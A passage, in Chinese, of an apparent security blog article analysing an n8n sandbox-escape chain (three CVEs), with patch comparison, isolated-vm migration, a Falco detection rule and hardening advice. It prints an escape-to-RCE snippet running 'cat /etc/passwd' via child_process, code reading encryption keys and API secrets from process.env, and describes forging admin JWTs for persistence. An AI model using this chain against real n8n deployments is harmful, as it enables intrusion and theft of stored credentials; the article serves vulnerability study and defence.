+<p><strong>第二步：沙箱逃逸 payload 构造</strong></p>
+<p>根据目标 n8n 版本与补丁状态选择对应的逃逸 payload：</p>
+<ul>
+<li>未打补丁的早期版本：使用 CVE-2025-68613 原型链攀登</li>
+<li>补丁了原型链但未处理 with 语句：使用 CVE-2026-1470</li>
+<li>补丁了 with 语句但 AST 消毒器有遗漏：使用 CVE-2026-27495 解构/SpreadElement 绕过</li>
+</ul>
+<p><strong>第三步：获取 process 对象</strong></p>
+<p>无论采用哪种逃逸技术，核心目标都是获取宿主 Node.js 进程的 <code>process</code> 对象。<code>process</code> 对象是 Node.js 的全局对象，持有进程级别的全部能力，其中 <code>process.mainModule</code> 指向主模块，其 <code>require</code> 方法可以加载任意 Node.js 内置模块。</p>
+<p><strong>第四步：child_process 命令执行</strong></p>
+<p>获取 <code>process</code> 对象后，通过 <code>process.mainModule.require('child_process')</code> 加载 <code>child_process</code> 模块，调用 <code>execSync</code> 或 <code>exec</code> 执行系统命令：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 完整逃逸链</span>
+<span class="c1">// 1. 通过沙箱逃逸获取 process 对象</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&lt;</span><span class="nx">escape_payload</span><span class="o">&gt;</span>
+<span class="c1">// 例如: this.constructor.constructor(&#39;return process&#39;)()</span>
+
+<span class="c1">// 2. 获取 child_process 模块</span>
+<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">exec</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
+
+<span class="c1">// 3. 执行系统命令</span>
+<span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;id; whoami; cat /etc/passwd&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">stdout</span><span class="p">,</span><span class="w"> </span><span class="nx">stderr</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 输出结果</span>
+<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
+<span class="p">})</span>
+</code></pre></div>
+
+<h3>以 n8n 进程身份执行命令</h3>
+<p><strong>进程权限分析</strong></p>
+<p>逃逸成功后，攻击者执行的命令以 n8n 进程的身份运行。在典型部署中，n8n 进程的权限取决于部署方式：</p>
+<ul>
+<li><strong>Docker 部署</strong>：默认以容器内的 <code>node</code> 用户运行，若未配置 <code>--cap-drop=ALL</code>，容器内仍可能通过内核漏洞提权。</li>
+<li><strong>直接部署</strong>：常以 <code>root</code> 或具有 sudo 权限的运维用户启动，RCE 后直接获得 root 级别权限。</li>
+<li><strong>Kubernetes 部署</strong>：Pod 的 ServiceAccount 权限决定了后续横向移动的能力。</li>
+</ul>
+<p><strong>环境变量泄露</strong></p>
+<p>n8n 进程的环境变量中包含大量高价值敏感信息，逃逸后可通过 <code>process.env</code> 直接读取：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 读取 n8n 加密主密钥</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">encryptionKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">N8N_ENCRYPTION_KEY</span><span class="p">;</span>
+
+<span class="c1">// 读取数据库连接字符串（可能包含明文密码）</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">dbUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DATABASE_URL</span><span class="p">;</span>
+
+<span class="c1">// 读取各类 API 密钥</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">openaiKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">OPENAI_API_KEY</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">awsKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">AWS_ACCESS_KEY_ID</span><span class="p">;</span>
+
+<span class="c1">// 读取 n8n 配置</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">n8nUserFolder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">N8N_USER_FOLDER</span><span class="p">;</span>
+</code></pre></div>
+
+<p>其中最关键的是 <code>N8N_ENCRYPTION_KEY</code>（加密主密钥）。n8n 将所有连接服务的凭证（AWS 密钥、数据库密码、OAuth 令牌等）以 AES-256 加密后存储在 SQLite 数据库（默认路径 <code>~/.n8n/database.sqlite</code>）中。获取主密钥即可解密全部存储凭证，等同于拿到了该组织整个自动化生态的"万能钥匙"。</p>
+<p>此外，n8n 使用 JWT 进行会话认证，JWT 的签名密钥正是从 <code>encryptionKey</code> 派生。攻击者获取主密钥后，可伪造 <code>role: "admin"</code> 的 JWT 令牌，无需再次 RCE 即可通过正常 API 接管整个 n8n 实例，创建持久化的"影子工作流"（由 Cron 节点定时触发的恶意工作流）实现无文件持久化。</p>
+<hr />
+<h2>补丁对比分析</h2>
+<h3>VM2 弃用与替代方案</h3>
+<p><strong>vm2 项目正式废弃原因</strong></p>
+<p>VM2 项目在积累了 13 个以上 critical 级别的沙箱逃逸 CVE 后，最终被官方正式归档废弃。其根本原因在于 VM2 的安全模型存在结构性缺陷：</p>
+<ol>
+<li>
+<p><strong>打补丁式防御的不可持续性</strong>：VM2 的每一次修复都是针对特定逃逸路径的局部修补，而 JavaScript 语言的动态特性保证了新的逃逸路径会不断涌现。从原型链攀登、with 语句欺骗、WebAssembly 异常处理旁路到 Promise species 绕过，VM2 的逃逸手法层出不穷。</p>
+</li>
+<li>
+<p><strong>同进程隔离的固有局限</strong>：VM2 在同一 Node.js 进程内执行不可信代码，沙箱代码与宿主代码共享同一个 V8 堆。任何 V8 引擎层面的边界缺陷都会直接导致沙箱逃逸，且沙箱代码可以通过内存操作影响宿主进程的稳定性。</p>
+</li>
+<li>
+<p><strong>Proxy 拦截的覆盖盲区</strong>：如前文分析，Proxy 只能拦截显式属性访问，无法覆盖作用域链解析、WebAssembly 指令路径等隐式访问。这是 Proxy 沙箱的固有局限。</p>
+</li>
+</ol>
+<p>VM2 官方在 README 中明确声明：<strong>"The library contains critical security issues and should not be used for production! The maintenance of the project has been discontinued."</strong> 并推荐迁移到 <code>isolated-vm</code>。</p>
+<p><strong>isolated-vm 替代方案对比</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>VM2</th>
+<th>isolated-vm</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>隔离机制</strong></td>
+<td>同进程，Proxy + AST 转换</td>
+<td>独立 V8 Isolate，独立内存堆</td>
+</tr>
+<tr>
+<td><strong>内存隔离</strong></td>
+<td>共享堆，可被内存操作绕过</td>
+<td>物理隔离的内存堆，跨 isolate 访问需显式序列化</td>
+</tr>
+<tr>
+<td><strong>逃逸历史</strong></td>
+<td>13+ 个 critical CVE</td>
+<td>无已知逃逸漏洞</td>
+</tr>
+<tr>
+<td><strong>性能开销</strong></td>
+<td>低（同进程）</td>
+<td>中等（跨 isolate 通信有序列化开销）</td>
+</tr>
+<tr>
+<td><strong>模块支持</strong></td>
+<td>可 require 白名单模块</td>
+<td>需通过显式 transferable 传递数据</td>
+</tr>
+<tr>
+<td><strong>维护状态</strong></td>
+<td>已废弃</td>
+<td>活跃维护</td>
+</tr>
+</tbody>
+</table>
+<p>isolated-vm 基于 V8 的 Isolate 机制，每个沙箱拥有独立的 V8 实例和独立内存堆。沙箱代码与宿主代码之间的数据交换必须通过显式的 <code>copy</code> 或 <code>transfer</code> 操作进行序列化，不存在原型链或作用域链等隐式连接路径。这种"物理隔离"模型从根本上消除了 VM2 类的逃逸可能。</p>
+<h3>n8n 的修复措施</h3>
+<p><strong>补丁 diff 分析</strong></p>
+<p>n8n 针对 CVE-2025-68613 引入了多层防御，包括正则校验、PrototypeSanitizer 和 FunctionThisSanitizer。但这些补丁的本质是"在 AST 层面枚举危险模式"，而非"改变隔离架构"，因此被 CVE-2026-27495 的解构赋值绕过。</p>
+<p>CVE-2026-27495 的修复（1.123.17 / 2.5.2 版本）采取了以下措施：</p>
+<ol>
+<li>
+<p><strong>扩展 AST 覆盖</strong>：PrototypeSanitizer 增加了对 <code>ObjectPattern</code>（解构赋值）和 <code>SpreadElement</code>（展开元素）节点的遍历检查，使 <code>const { constructor } = obj</code> 和 <code>{...process}</code> 不再处于检查盲区。</p>
+</li>
+<li>
+<p><strong>运行时类型检查</strong>：在消毒函数中增加了运行时类型校验，不再完全依赖编译期的 AST 节点类型判断，对运行时动态产生的属性访问也进行拦截。</p>
+</li>
+<li>
+<p><strong>箭头函数 <code>this</code> 处理</strong>：FunctionThisSanitizer 扩展为同时处理 <code>ArrowFunctionExpression</code> 节点，确保箭头函数继承的 <code>this</code> 也被绑定到安全上下文。</p>
+</li>
+</ol>
+<p><strong>新沙箱实现方案</strong></p>
+<p>n8n 最终走上了架构级修复的道路，推出了基于 isolated-vm 的全新表达式运行时 <code>@n8n/expression-runtime</code>：</p>
+<ul>
+<li><strong>V8 Isolate 隔离</strong>：表达式在独立的 V8 Isolate 中执行，拥有独立的 128MB 内存限制和 5 秒超时限制。</li>
+<li><strong>延迟数据加载</strong>：通过显式的跨 Isolate 数据传输实现数据访问，不再通过共享对象图暴露宿主对象。</li>
+<li><strong>进程级隔离规划</strong>：Task Runners 模式将表达式执行放在独立进程中，通过 IPC 通信，实现更深层的隔离。</li>
+<li><strong><code>N8N_BLOCK_ENV_ACCESS_IN_NODE</code> 环境变量</strong>：阻断节点内对 <code>process.env</code> 的访问，即使代码执行成功也降低凭证泄露风险。</li>
+</ul>
+<p>这种从"同进程 Proxy 沙箱"到"独立 Isolate 沙箱"的架构跃迁，才是终结沙箱逃逸军备竞赛的根本方案。</p>
+<hr />
+<h2>检测与防御</h2>
+<h3>输入验证</h3>
+<p><strong>表达式内容白名单</strong></p>
+<p>对表达式内容实施严格白名单是纵深防御的第一层。建议策略：</p>
+<ul>
+<li>禁止 <code>with</code> 语句、<code>eval</code>、<code>Function</code> 构造器的任何形式调用。</li>
+<li>对表达式 AST 进行白名单校验：仅允许 <code>MemberExpression</code>、<code>CallExpression</code>、<code>Literal</code>、<code>Identifier</code>、<code>BinaryExpression</code> 等安全节点类型，拒绝 <code>WithStatement</code>、<code>ObjectPattern</code> 中的危险属性名、<code>SpreadElement</code> 中的危险标识符。</li>
+<li>对节点参数中的表达式来源进行审计：区分"工作流设计者编写"与"运行时用户输入注入"两种来源，对后者实施更严格的过滤。</li>
+</ul>
+<p>需要注意的是，输入验证只能作为辅助手段——如前文所示，解释型语言的静态过滤可被编码、拼接、Reflect API 等手段轻易绕过。</p>
+<h3>运行时监控</h3>
+<p><strong>进程创建监控</strong></p>
+<p>在 n8n 运行环境中部署进程创建监控，检测异常的子进程派生行为：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Falco 规则示例：检测 n8n 进程派生子进程</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">n8n Unexpected Child Process</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Detect n8n process spawning shell commands</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">evt.type=execve and </span>
+<span class="w">    </span><span class="no">proc.name in (bash, sh, zsh, nc, curl, wget, python) and </span>
+<span class="w">    </span><span class="no">proc.pname=node</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">n8n process spawned suspicious child </span>
+<span class="w">    </span><span class="no">(user=%user.name command=%proc.cmdline </span>
+<span class="w">    </span><span class="no">parent=%proc.pname)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+</code></pre></div>
+
+<p>正常 n8n 工作流不应直接派生 shell 子进程。当检测到 <code>node</code>（n8n 进程）派生 <code>bash</code>、<code>sh</code>、<code>curl</code>、<code>wget</code> 等进程时，应立即告警并触发应急响应。</p>
+<p><strong>异常网络连接检测</strong></p>
+<p>n8n 的正常网络连接应仅限于已配置的集成服务端点。监控 n8n 进程的出站连接，对以下异常模式告警：</p>
+<ul>
+<li>连接到非常见端口的反向 shell 连接</li>
+<li>连接到已知恶意 C2 基础设施</li>
+<li>数据外泄模式（大量出站流量到非预期端点）</li>
+<li>DNS 隧道特征（异常长域名查询、高频 TXT 记录查询）</li>
+</ul>
+<h3>加固建议</h3>
+<p><strong>最小权限运行 n8n</strong></p>
+<ul>
+<li>创建专用低权限系统用户运行 n8n，禁止以 root 身份启动。</li>
+<li>Docker 部署时使用 <code>--cap-drop=ALL</code> 丢弃全部 Linux capabilities，仅按需添加最小必要权限。</li>
+<li>文件系统设置为只读（<code>--read-only</code>），仅对 <code>~/.n8n</code> 数据目录挂载可写卷。</li>
+<li>通过 seccomp profile 限制系统调用，阻断 <code>ptrace</code>、<code>mount</code> 等提权相关调用。</li>
+</ul>
+<p><strong>容器化部署</strong></p>
+<ul>
+<li>使用非特权容器（rootless container）运行 n8n。</li>
+<li>配置容器资源限制（CPU、内存），防止资源耗尽型 DoS。</li>
+<li>定期扫描容器镜像中的已知漏洞组件。</li>
+<li>在容器运行时（如 gVisor / Kata Containers）层面增加一层隔离，即使容器内 RCE 也难以逃逸到宿主机。</li>
+</ul>
+<p><strong>网络分段</strong></p>
+<ul>
+<li>将 n8n 部署在隔离的网络区域，通过 Kubernetes NetworkPolicy 或云安全组限制其出站流量，仅允许访问工作流必需的 API 端点。</li>
+<li>阻断 n8n 容器到内网管理平面、元数据服务（如 AWS IMDS <code>169.254.169.254</code>）的直接访问。</li>
+<li>对 n8n 的 <code>/form/*</code> 端点和 webhook 端点实施 WAF 保护与速率限制。</li>
+<li>定期审计暴露在公网的 n8n 实例与表单端点，通过空间测绘工具（FOFA、Shodan）发现未授权暴露的资产。</li>
+</ul>
+<p><strong>凭证管理加固</strong></p>
+<ul>
+<li>设置 <code>N8N_BLOCK_ENV_ACCESS_IN_NODE=true</code>，阻断节点内对环境变量的访问。</li>
+<li>定期轮换 <code>N8N_ENCRYPTION_KEY</code>，轮换后重新加密所有存储凭证。</li>
+<li>将高权限凭证（AWS root key、数据库管理员密码）替换为最小权限的临时凭证或 IAM 角色。</li>
+<li>对 n8n 数据库文件（<code>database.sqlite</code>）实施严格的文件系统权限控制，限制仅 n8n 进程用户可读。</li>
+</ul>
+<hr />
+<h2>总结</h2>
+<p>n8n 沙箱逃逸漏洞链（CVE-2025-68613 → CVE-2026-1470 → CVE-2026-27495）完整呈现了 JavaScript 沙箱安全的攻防演进：</p>
+<ul>
+<li><strong>CVE-2025-68613</strong> 揭示了原型链这一根本攻击面——只要沙箱内的对象通过原型链连接到宿主构造器，<code>constructor.constructor</code> 这条经典攀登路径就能突破隔离。</li>
+<li><strong>CVE-2026-1470</strong> 展示了语言级特性对 Proxy 拦截的旁路——<code>with</code> 语句的作用域链操纵使标识符解析绕过了属性访问层的 Proxy trap。</li>
+<li><strong>CVE-2026-27495</strong> 证明了 AST 节点类型枚举的不可靠——解构赋值、SpreadElement、箭头函数等语法变体产生了消毒器未覆盖的 AST 节点。</li>
+</ul>
+<p>这三个漏洞共同指向一个结论：<strong>在同进程内通过语言层面的拦截（Proxy + AST 转换）来实现代码隔离，在 JavaScript 这种高度动态的语言中是不可持续的</strong>。VM2 项目在 13 个以上 critical CVE 后最终被废弃，正是这一结论的实践验证。n8n 迁移到基于 V8 Isolate 的 <code>isolated-vm</code>，从物理内存隔离层面切断沙箱与宿主之间的隐式连接，才是终结这场军备竞赛的根本路径。</p>
+<p>对于安全防御者而言，核心启示在于：面对图灵完备的代码执行能力，应当假设应用层的沙箱终将被突破，转而构建纵深防御体系——最小权限进程、容器隔离、网络分段、运行时监控、凭证轮换，每一层都是假设上一层已被攻破后的最后防线。</p>
+<hr />
+<h2>参考资料</h2>
+<ul>
+<li>NVD - CVE-2025-68613 Detail: https://nvd.nist.gov/vuln/detail/CVE-2025-68613</li>
+<li>Node.js VM 模块安全警告: https://nodejs.org/api/vm.html</li>
+<li>n8n 安全公告: https://github.com/n8n-io/n8n/security</li>
+<li>vm2 项目归档声明（npm @n8n/vm2）: https://www.npmjs.com/package/@n8n/vm2</li>
+<li>isolated-vm 项目: https://github.com/laverdet/isolated-vm</li>
+<li>n8n expression-runtime（isolated-vm 方案）: https://www.npmjs.com/package/@n8n/expression-runtime</li>
+</ul>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
